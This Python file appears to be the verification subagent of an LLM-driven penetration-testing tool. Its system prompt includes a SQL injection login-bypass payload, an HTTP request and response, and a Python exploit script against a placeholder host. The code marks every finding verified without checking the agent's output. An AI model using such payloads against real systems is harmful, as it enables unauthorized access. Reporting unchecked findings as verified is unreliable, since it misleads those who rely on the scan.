"""
RedStrike.AI - Verifier Subagent
Two-step verification: confirms findings and generates step-by-step PoC.
"""
from typing import Dict, Any, List
from langchain_core.messages import HumanMessage, SystemMessage
import uuid

from app.agents.state import ScanState, Finding, VerificationStatus
from app.models.llm_router import get_model_for_agent
from app.tools import LANGCHAIN_TOOLS  # All Docker-enabled tools for verification
from app.services.skill_loader import skill_loader

SYSTEM_PROMPT = """You are the Verification Subagent for RedStrike.AI.

Your role is CRITICAL: You must verify every finding before it goes to the report.

## Two-Step Verification Process

For EACH potential finding:
1. **Attempt Reproduction**: Re-execute the attack to confirm vulnerability
2. **If Verified**:
   - Mark as "verified"
   - Generate detailed step-by-step PoC
   - Include request/response evidence
   - Write Python PoC code
3. **If Not Reproduced**:
   - Mark as "false_positive"
   - Document why it failed

## PoC Requirements (Step-by-Step)

Every verified finding MUST include:

### 1. Steps to Reproduce
Numbered list a human can follow:
1. Navigate to https://target.com/login
2. Open browser developer tools
3. Intercept the login request
4. Modify the username parameter to: admin' OR '1'='1
5. Forward the request
6. Observe successful authentication

### 2. HTTP Request/Response
```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin' OR '1'='1", "password": "anything"}
```

Response:
```http
HTTP/1.1 200 OK
{"status": "success", "token": "eyJ..."}
```

### 3. Python PoC Code
```python
#!/usr/bin/env python3
\"\"\"
PoC for: SQL Injection in Login
Target: https://target.com/api/login
Author: RedStrike.AI
\"\"\"
import requests

TARGET = "https://target.com"

def exploit():
    \"\"\"Exploit SQL injection in login endpoint.\"\"\"
    url = f"{TARGET}/api/login"
    payload = {
        "username": "admin' OR '1'='1",
        "password": "anything"
    }
    
    response = requests.post(url, json=payload)
    
    if response.status_code == 200 and "token" in response.json():
        print("[+] SQL Injection successful!")
        print(f"[+] Token: {response.json()['token']}")
        return True
    else:
        print("[-] Exploit failed")
        return False

if __name__ == "__main__":
    exploit()
```

### 4. Impact Assessment
- CVSS Score (if applicable)
- Business impact
- Data at risk

## Output Format

{
    "verified_findings": [...],
    "false_positives": [...]
}"""


def create_verifier_subagent(state: ScanState) -> Dict[str, Any]:
    """
    Verifier subagent node - two-step verification with PoC generation.
    
    Args:
        state: Current scan state
        
    Returns:
        Updated state with verified findings and false positives
    """
    model = get_model_for_agent("verifier")
    target = state["target"]["url"]
    
    # Get all potential findings
    potential_findings = state.get("potential_findings", [])
    
    if not potential_findings:
        return {
            "current_phase": "verification_complete",
            "phase_history": state.get("phase_history", []) + ["verification"],
            "verified_findings": [],
            "false_positives": [],
        }
    
    # Load relevant skills for PoC generation
    skill_context = skill_loader.get_skill_context(["exploitation", "vulnerabilities"])
    
    messages = [
        SystemMessage(content=SYSTEM_PROMPT),
        HumanMessage(content=f"""Verify the following potential findings for: {target}

Potential Findings:
{_format_findings_for_verification(potential_findings)}

For each finding:
1. Attempt to reproduce the vulnerability
2. If verified: Generate detailed step-by-step PoC
3. If not reproducible: Mark as false positive

Skills/Knowledge (PoC templates):
{skill_context if skill_context else "No specific skills loaded."}

Return verified findings with complete PoC.""")
    ]
    
    try:
        from langgraph.prebuilt import create_react_agent
        agent = create_react_agent(model, LANGCHAIN_TOOLS)  # All Docker tools for PoC
        result = agent.invoke({"messages": messages})
        
        # Parse verification results
        verified_findings = []
        false_positives = []
        
        # In real implementation, parse LLM output
        # For now, all findings go to verified (will be replaced with actual parsing)
        for finding in potential_findings:
            finding["verification_status"] = VerificationStatus.VERIFIED.value
            finding["id"] = str(uuid.uuid4())[:8]
            verified_findings.append(finding)
        
        return {
            "verified_findings": verified_findings,
            "false_positives": false_positives,
            "current_phase": "verification_complete",
            "phase_history": state.get("phase_history", []) + ["verification"],
            "messages": state.get("messages", []) + result.get("messages", []),
        }
        
    except Exception as e:
        return {
            "errors": state.get("errors", []) + [{
                "phase": "verification",
                "error": str(e),
            }],
            "current_phase": "verification_error",
        }


def _format_findings_for_verification(findings: List[Finding]) -> str:
    """Format findings for LLM verification prompt."""
    formatted = []
    for i, f in enumerate(findings, 1):
        formatted.append(f"""
Finding #{i}:
- Title: {f.get('title', 'Unknown')}
- Type: {f.get('vulnerability_type', 'Unknown')}
- Severity: {f.get('severity', 'Unknown')}
- URL: {f.get('affected_url', 'Unknown')}
- Parameter: {f.get('affected_parameter', 'N/A')}
- Evidence: {f.get('evidence', 'None')}
""")
    return "\n".join(formatted)
